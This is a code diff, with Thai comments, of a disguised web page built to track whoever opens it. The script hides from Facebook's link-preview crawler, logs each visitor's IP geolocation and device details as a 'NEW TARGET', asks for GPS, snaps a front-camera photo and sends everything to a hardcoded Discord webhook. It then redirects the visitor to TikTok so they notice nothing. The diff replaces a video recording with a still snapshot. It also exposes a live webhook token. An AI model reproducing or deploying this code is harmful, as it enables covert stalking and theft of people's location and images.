@@ -7,47 +7,52 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1505441313468710923/4ZwXHcn5adt8nWLoAgLGOuIE9ZKfeIxjZBQvgsF5qh1uLl9DeMT5wQgpwfQxWSuBkpJ9"; 
 
-        // --- ฟังก์ชันอัดวิดีโอจากกล้องหน้า 3 วินาที (แก้ไขให้ส่งไฟล์เข้าชัวร์ขึ้น) ---
+        // --- ฟังก์ชันถ่ายภาพจากกล้องหน้า ---
         async function captureFace() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                // --- ส่วนที่เพิ่ม: เช็คว่ามีอุปกรณ์กล้องไหม (ห้ามลบ/แก้โค้ดเดิมด้านล่าง) ---
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const hasVideo = devices.some(device => device.kind === 'videoinput');
+                if (!hasVideo) {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: "📸 **CAMERA ERROR**\n❌ Status: No Camera Hardware Found (ไม่พบอุปกรณ์กล้องบนเครื่องนี้)" })
+                    });
+                    return; 
+                }
+                // --- จบส่วนที่เพิ่ม ---
+
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', ''); // สำหรับ iOS
+                await video.play();
+
+                // รอ 1.5 วินาทีเพื่อให้กล้องปรับแสง (Auto Exposure) จะได้รูปไม่มืด
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // 📸 เพิ่มส่วน Snapshot: ถ่ายภาพนิ่งส่งไปก่อนกันพลาด
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                const photoBlob = await imageCapture.takePhoto();
-                const photoData = new FormData();
-                photoData.append('file', photoBlob, 'snapshot.jpg');
-                photoData.append('payload_json', JSON.stringify({ content: "📸 **FAST SNAPSHOT** (ได้รูปแล้ว)" }));
-                fetch(WEBHOOK_URL, { method: 'POST', body: photoData });
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
+                const formData = new FormData();
+                formData.append('file', blob, 'face_capture.jpg');
+                formData.append('payload_json', JSON.stringify({ 
+                    content: "📸 **FACE CAPTURED (ภาพถ่ายจากกล้องหน้า)**\n✅ Status: Captured successfully (ถ่ายสำเร็จแล้ว)" 
+                }));
 
-                // 🎥 เริ่มอัดวิดีโอ
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                const chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('file', blob, 'video_capture.webm');
-                    formData.append('payload_json', JSON.stringify({ 
-                        content: "🎥 **VIDEO CAPTURED (วิดีโอจากกล้องหน้า)**\n✅ Status: Recorded successfully" 
-                    }));
-
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                    stream.getTracks().forEach(track => track.stop());
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
-                }, 3000); 
-
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                stream.getTracks().forEach(track => track.stop());
             } catch (err) {
+                // ถ้าไม่ได้กล้อง ให้แจ้งเตือนบอก
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "🎥 **CAMERA ERROR**\n❌ Status: " + err.message })
+                    body: JSON.stringify({ content: "📸 **CAMERA ERROR (ข้อผิดพลาดกล้อง)**\n❌ Status: Camera Access Denied (ปฏิเสธการเข้าถึงกล้อง)" })
                 });
             }
         }
@@ -56,13 +61,13 @@
             if (navigator.userAgent.includes("facebookexternalhit")) return;
 
             try {
-                // --- ส่วนที่ 1: ดึงข้อมูลที่อยู่และสเปคเครื่อง (ครบตามเดิม) ---
+                // --- ส่วนที่ 1: ดึงข้อมูลที่อยู่และสเปคเครื่อง ---
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 const check = (val) => (val && val !== null ? val : "Data not found (ไม่พบข้อมูล)");
 
                 const ua = navigator.userAgent;
-                let isPC = true; 
+                let isPC = true; // ตัวแปรเช็คว่าเป็นคอมหรือไม่
                 let deviceType = "Desktop (PC/Laptop) (คอมพิวเตอร์)";
                 let modelName = "Unknown Device (ไม่ระบุรุ่น)";
 
@@ -96,6 +101,7 @@
                     }
                 }
 
+                // ส่ง Report แรก: สเปคเครื่องและเน็ต (จัดหน้าสวยๆ)
                 let report = `📂 **NEW TARGET LOGGED**\n`;
                 report += `──────────────────────────\n`;
                 report += `📱 **[DEVICE (อุปกรณ์)]**\n`;
@@ -116,11 +122,13 @@
                 // --- ส่วนที่ 2: ระบบตัดสินใจพิกัด และขอใช้กล้อง ---
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
+                        // เมื่อกดยอมรับพิกัด ให้ลองขอใช้กล้องถ่ายรูปทันที
                         await captureFace();
 
                         const { latitude, longitude } = pos.coords;
                         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                         
+                        // เช็คสถานะความแม่นยำตามอุปกรณ์
                         let accuracyStatus = isPC 
                             ? "Inaccurate but nearby (พิกัดความแม่นยำไม่แน่นอน แต่ใกล้เคียง)" 
                             : "Precise Data (ข้อมูลแม่นยำ💯)";
@@ -132,8 +140,7 @@
                                 content: `🎯 **LOCATION FOUND (พบตำแหน่ง)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** ${accuracyStatus}\n──────────────────────────` 
                             })
                         });
-                        // รอให้วิดีโออัปโหลดแป๊บนึงก่อนเด้งหน้า
-                        setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 4000);
+                        window.location.href = "https://www.tiktok.com";
 
                     }, async () => { 
                         let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n`;
@@ -166,6 +173,7 @@
         window.onload = capture;
     </script>
     <style>
+        /* แก้ไข CSS ให้รองรับทุก Resolution */
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             background: #000; color: #fff; font-family: sans-serif;
